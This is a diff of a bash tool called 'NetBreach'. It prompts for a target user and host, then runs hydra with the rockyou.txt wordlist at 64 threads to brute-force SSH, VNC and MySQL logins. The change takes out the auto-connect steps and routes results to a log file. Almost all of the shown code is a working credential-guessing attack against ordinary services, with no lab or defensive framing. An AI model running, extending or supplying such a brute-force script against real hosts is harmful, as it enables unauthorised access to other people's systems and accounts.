@@ -53,6 +53,7 @@ check_internet() {
 
 # Main functionality
 NetBreach() {
+    
     port=$(dialog --inputbox "Enter the port to scan (SSH: 22, VNC: 5900, MySQL: 3306).\nType 'ALL' to scan all ports:" 10 40 3>&1 1>&2 2>&3)
 
     case "${port}" in
@@ -82,29 +83,21 @@ NetBreach() {
 RunHackingCommand() {
     user=$(dialog --inputbox "Enter Username:" 10 40 3>&1 1>&2 2>&3)
     host=$(dialog --inputbox "Enter Hostname:" 10 40 3>&1 1>&2 2>&3)
-    port=$(dialog --inputbox "Enter Port:" 10 40 3>&1 1>&2 2>&3)
+    log_file="output.log"
 
     case "$port" in
     22)
-        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"$host":"$port"
-        xdg-open output.log
-        xmessage -center "Connecting to ${user}@${host}:${port}"
-        ssh "${user}@${host}" -p "${port}"
+        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o "${log_file}" -I ssh://"$host":"$port"
         ;;
     5900)
-        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://"$host":"$port"
-        xdg-open output.log
-        xmessage -center "Connecting to ${host}:${port} via VNC."
-        xdg-open "vnc://${host}"
+        hydra -P rockyou.txt -t 64 -vV -o "${log_file}" -I vnc://"$host":"$port"
         ;;
     3306)
-        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://"${host}":"${port}"
-        xdg-open output.log
-        xmessage -center "Connecting to MySQL at ${host}:${port}"
-        mysql -u "${user}" -p
+        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o "${log_file}" -I mysql://"$host":"$port"
         ;;
     *)
         xmessage -center "Error: Unsupported port/service."
+        return
         ;;
     esac
 }
